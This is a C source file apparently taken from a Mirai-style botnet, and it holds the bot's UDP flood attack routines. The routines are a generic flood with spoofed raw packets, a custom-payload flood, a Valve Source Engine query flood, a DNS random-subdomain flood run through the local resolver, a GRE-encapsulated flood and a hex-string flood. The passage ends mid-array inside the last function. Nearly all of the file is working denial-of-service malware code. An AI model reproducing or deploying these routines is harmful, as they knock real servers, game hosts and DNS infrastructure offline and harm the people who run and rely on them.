#define _GNU_SOURCE
#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/if_ether.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>

#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"
#include "util.h"
#include "table.h"
#include "protocol.h"

static ipv4_t get_dns_resolver(void);

void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{

    #ifdef DEBUG
     printf("UDP!\n");
    #endif

    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    uint16_t data_minlen = attack_get_opt_int(opts_len, opts, ATK_OPT_MIN_SIZE, 1);
    uint16_t data_maxlen = attack_get_opt_int(opts_len, opts, ATK_OPT_MAX_SIZE, 1);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    uint8_t repeat = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_REPEAT, 0);



    if (data_minlen == 1 && data_maxlen == 1)
    {
        #ifdef DEBUG
            printf("min and max len not set, using len (len=%d)\n", data_len);
        #endif
    } else {
        data_len = data_minlen + rand_next() % (data_maxlen - data_minlen);
        // data_len = rand() % data_maxlen + data_minlen;;
        #ifdef DEBUG
            printf("using random len %d\n", data_len);
        #endif
    }

    


    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n");
#endif
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(fd);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;

        pkts[i] = calloc(1510, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        udph = (struct udphdr *)(iph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + data_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_UDP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;

        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof (struct udphdr) + data_len);
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct udphdr *udph = (struct udphdr *)(iph + 1);
            char *data = (char *)(udph + 1);

            // For prefix attacks
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();

            if (ip_ident == 0xffff)
                iph->id = (uint16_t)rand_next();
            if (sport == 0xffff)
                udph->source = rand_next();
            if (dport == 0xffff)
                udph->dest = rand_next();

            // Randomize packet content?
            if (data_rand)
                rand_str(data, data_len);

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

            udph->check = 0;
            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof (struct udphdr) + data_len);

            targs[i].sock_addr.sin_port = udph->dest;
            #ifdef DEBUG
                printf("sending attack with len=%d and pkt=%s\n", data_len, pkt);
            #endif
            if (repeat == 0) {
                sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
            } else {
                int r = 0;
                for (r = 0; r < repeat; r++)
                {
                    sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
                }
            }
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno);
#endif
    }
}

// udp custom
void attack_udp_custom(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
#ifdef DEBUG
    printf("in udp custom\n");
#endif

    int i;
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    uint16_t data_minlen = attack_get_opt_int(opts_len, opts, ATK_OPT_MIN_SIZE, 1); //minlen
    uint16_t data_maxlen = attack_get_opt_int(opts_len, opts, ATK_OPT_MAX_SIZE, 1); //maxlen
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    struct sockaddr_in bind_addr = {0};
    char *cpayload = attack_get_opt_str(opts_len, opts, ATK_OPT_PAYLOAD_ONE, NULL);
    uint8_t repeat = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_REPEAT, 0);
    

    if (sport == 0xffff)
    {
        //myb
        sport = htons(10000 + rand_next() % (65535 - 10000));
    } else {
        sport = htons(sport);
    }



    if (cpayload == NULL) {

        if (data_minlen == 1 && data_maxlen == 1)
        {
            #ifdef DEBUG
                printf("min and max len not set, using len (len=%d)\n", data_len);
            #endif
        } else {
            data_len = data_minlen + rand_next() % (data_maxlen - data_minlen);
            // data_len = rand() % data_maxlen + data_minlen;;
            #ifdef DEBUG
                printf("using random len %d\n", data_len);
            #endif
        }
    } else {
        data_len = util_strlen(cpayload);
    }

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;

        pkts[i] = calloc(65535, sizeof (char));

        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = htons(10000 + rand_next() % (65535 - 10000));
        else
            targs[i].sock_addr.sin_port = htons(dport);

        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
        {
#ifdef DEBUG
            printf("Failed to create udp socket. Aborting attack\n");
#endif
            return;
        }

        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;

        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("Failed to bind udp socket.\n");
#endif
        }

        // For prefix attacks
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("Failed to connect udp socket.\n");
#endif
        }
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *data = pkts[i];

            // randomize only for non custom payload
            if (cpayload == NULL) {
                if (data_rand) {
                    rand_str(data, data_len);
                }
            } 


#ifdef DEBUG
            errno = 0;

            if (cpayload == NULL) {
                if (repeat == 0) {
                    if (send(fds[i], data, data_len, MSG_NOSIGNAL) == -1)
                    {
                        printf("[non custom payload] send failed: %d\n", errno);
                    } else {
                        printf("[non custom payload] sending attack with len=%d\n", data_len);
                    }
                } else {
                    int r = 0;
                    for (r = 0; r < repeat; r++)
                    {
                        if (send(fds[i], data, data_len, MSG_NOSIGNAL) == -1)
                        {
                            printf("[non custom payload %d] send failed: %d\n", r, errno);
                        } else {
                            printf("[non custom payload %d] sending attack with len=%d\n", r, data_len);
                        }
                    }
                }
            } else {
                if (repeat == 0) {
                    data_len = util_strlen(cpayload);
                    if (send(fds[i], cpayload, data_len, MSG_NOSIGNAL) == -1)
                    {
                        printf("[using custom payload] send failed: %d\n", errno);
                    } else {
                        printf("[using custom payload] sending attack with len=%d and custom payload=%s\n", data_len, cpayload);
                    }
                } else {
                    int r = 0;
                    for (r = 0; r < repeat; r++)
                    {
                        data_len = util_strlen(cpayload);
                        if (send(fds[i], cpayload, data_len, MSG_NOSIGNAL) == -1)
                        {
                            printf("[using custom payload %d] send failed: %d\n", r, errno);
                        } else {
                            printf("[using custom payload %d] sending attack with len=%d and custom payload=%s\n", r, data_len, cpayload);
                        }
                    }
                }
            }
#else
            if (cpayload == NULL) {
                if (repeat == 0) {
                    send(fds[i], data, data_len, MSG_NOSIGNAL);
                } else {
                    int r = 0;
                    for (r = 0; r < repeat; r++)
                    {
                        send(fds[i], data, data_len, MSG_NOSIGNAL);
                    }
                }
            } else {
                data_len = util_strlen(cpayload);
                if (repeat == 0) {
                    send(fds[i], cpayload, data_len, MSG_NOSIGNAL);
                } else {
                    int r = 0;
                    for (r = 0; r < repeat; r++)
                    {
                        send(fds[i], cpayload, data_len, MSG_NOSIGNAL);
                    }
                }
            }
#endif
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno);
#endif
    }
}

// end udp custom


void attack_udp_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 27015);
    uint8_t repeat = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_REPEAT, 0);
    char *vse_payload;
    int vse_payload_len;

    table_unlock_val(TABLE_ATK_VSE);
    vse_payload = table_retrieve_val(TABLE_ATK_VSE, &vse_payload_len);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n");
#endif
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(fd);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;

        pkts[i] = calloc(128, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        udph = (struct udphdr *)(iph + 1);
        data = (char *)(udph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_UDP;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = targs[i].addr;

        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof (struct udphdr) + 4 + vse_payload_len);

        *((uint32_t *)data) = 0xffffffff;
        data += sizeof (uint32_t);
        util_memcpy(data, vse_payload, vse_payload_len);
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct udphdr *udph = (struct udphdr *)(iph + 1);
            
            // For prefix attacks
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            if (ip_ident == 0xffff)
                iph->id = (uint16_t)rand_next();
            if (sport == 0xffff)
                udph->source = rand_next();
            if (dport == 0xffff)
                udph->dest = rand_next();

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

            udph->check = 0;
            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len);

            targs[i].sock_addr.sin_port = udph->dest;
            if (repeat == 0) {
                sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
            } else {
                int r = 0;
                for (r = 0; r < repeat; r++)
                {
                    sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
                }
            }
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno);
#endif
    }
}

void attack_udp_dns(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 53);
    uint16_t dns_hdr_id = attack_get_opt_int(opts_len, opts, ATK_OPT_DNS_HDR_ID, 0xffff);
    uint8_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 12);
    uint16_t data_minlen = attack_get_opt_int(opts_len, opts, ATK_OPT_MIN_SIZE, 1); //minlen
    uint16_t data_maxlen = attack_get_opt_int(opts_len, opts, ATK_OPT_MAX_SIZE, 1); //maxlen
    char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
    uint8_t repeat = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_REPEAT, 0);
    int domain_len;
    ipv4_t dns_resolver = get_dns_resolver();

    if (domain == NULL)
    {
#ifdef DEBUG
        printf("Cannot send DNS flood without a domain\n");
#endif
        return;
    }
    domain_len = util_strlen(domain);

    // min max len

    if (data_minlen == 1 && data_maxlen == 1)
    {
        #ifdef DEBUG
            printf("min and max len not set, using len (len=%d)\n", data_len);
        #endif
    } else {
        data_len = data_minlen + rand_next() % (data_maxlen - data_minlen);
        // data_len = rand() % data_maxlen + data_minlen;;
        #ifdef DEBUG
            printf("using random len %d\n", data_len);
        #endif
    }

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n");
#endif
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(fd);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        int ii;
        uint8_t curr_word_len = 0, num_words = 0;
        struct iphdr *iph;
        struct udphdr *udph;
        struct dnshdr *dnsh;
        char *qname, *curr_lbl;
        struct dns_question *dnst;

        pkts[i] = calloc(600, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        udph = (struct udphdr *)(iph + 1);
        dnsh = (struct dnshdr *)(udph + 1);
        qname = (char *)(dnsh + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question));
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_UDP;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = dns_resolver;

        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question));

        dnsh->id = htons(dns_hdr_id);
        dnsh->opts = htons(1 << 8); // Recursion desired
        dnsh->qdcount = htons(1);

        // Fill out random area
        *qname++ = data_len;
        qname += data_len;

        curr_lbl = qname;
        util_memcpy(qname + 1, domain, domain_len + 1); // Null byte at end needed

        // Write in domain
        for (ii = 0; ii < domain_len; ii++)
        {
            if (domain[ii] == '.')
            {
                *curr_lbl = curr_word_len;
                curr_word_len = 0;
                num_words++;
                curr_lbl = qname + ii + 1;
            }
            else
                curr_word_len++;
        }
        *curr_lbl = curr_word_len;

        dnst = (struct dns_question *)(qname + domain_len + 2);
        dnst->qtype = htons(PROTO_DNS_QTYPE_A);
        dnst->qclass = htons(PROTO_DNS_QCLASS_IP);
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct udphdr *udph = (struct udphdr *)(iph + 1);
            struct dnshdr *dnsh = (struct dnshdr *)(udph + 1);
            char *qrand = ((char *)(dnsh + 1)) + 1;

            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;
            if (sport == 0xffff)
                udph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                udph->dest = rand_next() & 0xffff;

            if (dns_hdr_id == 0xffff)
                dnsh->id = rand_next() & 0xffff;

            rand_alphastr((uint8_t *)qrand, data_len);

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

            udph->check = 0;
            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question));

            targs[i].sock_addr.sin_addr.s_addr = dns_resolver;
            targs[i].sock_addr.sin_port = udph->dest;
            if (repeat == 0) {
                sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
            } else {
                int r = 0;
                for (r = 0; r < repeat; r++)
                {
                    sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)); 
                }
            }
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno);
#endif
    }
}

//udpraw

void attack_method_raw(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{

    #ifdef DEBUG
     printf("UDP!\n");
    #endif
    
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    BOOL gcip = attack_get_opt_int(opts_len, opts, ATK_OPT_GRE_CONSTIP, FALSE);
    uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    uint8_t repeat = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_REPEAT, 0);
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
    {
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        close(fd);
        return;
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct grehdr *greh;
        struct iphdr *greiph;
        struct udphdr *udph;
        pkts[i] = calloc(1510, sizeof (char *));
        iph = (struct iphdr *)(pkts[i]);
        greh = (struct grehdr *)(iph + 1);
        greiph = (struct iphdr *)(greh + 1);
        udph = (struct udphdr *)(greiph + 1);
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_GRE;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;
        greh->protocol = htons(ETH_P_IP);
        greiph->version = 4;
        greiph->ihl = 5;
        greiph->tos = ip_tos;
        greiph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + data_len);
        greiph->id = htons(~ip_ident);
        greiph->ttl = ip_ttl;
        if (dont_frag)
            greiph->frag_off = htons(1 << 14);
        greiph->protocol = IPPROTO_UDP;
        greiph->saddr = rand_next();
        if (gcip)
            greiph->daddr = iph->daddr;
        else
            greiph->daddr = ~(greiph->saddr - 1024);
        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof (struct udphdr) + data_len);
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct grehdr *greh = (struct grehdr *)(iph + 1);
            struct iphdr *greiph = (struct iphdr *)(greh + 1);
            struct udphdr *udph = (struct udphdr *)(greiph + 1);
            char *data = (char *)(udph + 1);
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();
            if (ip_ident == 0xffff)
            {
                iph->id = rand_next() & 0xffff;
                greiph->id = ~(iph->id - 1000);
            }
            if (sport == 0xffff)
                udph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                udph->dest = rand_next() & 0xffff;
            if (!gcip)
                greiph->daddr = rand_next();
            else
                greiph->daddr = iph->daddr;
            if (data_rand)
                rand_str(data, data_len);
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
            greiph->check = 0;
            greiph->check = checksum_generic((uint16_t *)greiph, sizeof (struct iphdr));
            udph->check = 0;
            udph->check = checksum_tcpudp(greiph, udph, udph->len, sizeof (struct udphdr) + data_len);
            targs[i].sock_addr.sin_family = AF_INET;
            targs[i].sock_addr.sin_addr.s_addr = iph->daddr;
            targs[i].sock_addr.sin_port = 0;

            if (repeat == 0) {
                sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
            } else {
                int r = 0;
                for (r = 0; r < repeat; r++)
                {
                    sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
                }
            }
        }
    }
}

void attack_udp_stdhex(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    char **pkts = calloc(targs_len, sizeof (char *)); //
    int *fds = calloc(targs_len, sizeof (int)); //
    unsigned char *hexstring = malloc(1024);
    memset(hexstring, 0, 1024);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1460);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    struct sockaddr_in bind_addr = {0};
    if (sport == 0xffff)
    {
        sport = rand_next();
    } else {
        sport = htons(sport);
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;
        pkts[i] = calloc(65535, sizeof (char)); //pkts[i]
        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_next();
        else
            targs[i].sock_addr.sin_port = htons(dport);
        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        {
            return;
        }
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;
        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
        {
            
        }
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1)
        {
            
        }
    }
    unsigned int a = 0;
    while (TRUE)
    {   
        char * randhex[] = {
        "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff",
        "\xe2\x9e\xba\x28\xa1\xc2\xb0\x20\x20\x9c\xca\x96\x20\xcd\xa1\xc2\xb0\x29\xe2\x9e\xba\x28\xa1\xc2\xb0\x20\x20\x9c\xca\x96\x20\xcd\xa1\xc2\xb0\x29\xe2\x9e\xba\x28\xa1\xc2\xb0\x20\x20\x9c\xca\x96\x20\xcd\xa1\xc2\xb0\x29\xe2\x9e\xba\x28\xa1\xc2\xb0\x20\x20\x9c\xca\x96\x20\xcd\xa1\xc2\xb0\x29\xe2\x9e\xba\x28\xa1\xc2\xb0\x20\x20\x9c\xca\x96\x20\xcd\xa1\xc2\xb0\x29\xe2\x9e\xba\x28\xa1\xc2\xb0\x20\x20\x9c\xca\x96\x20\xcd\xa1\xc2\xb0\x29\xe2\x9e\xba\x28\xa1\xc2\xb0\x20\x20\x9c\xca\x96\x20\xcd\xa1\xc2\xb0\x29\xe2\x9e\xba\x28\xa1\xc2\xb0\x20\x20\x9c\xca\x96\x20\xcd\xa1\xc2\xb0\x29",
        "\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48",
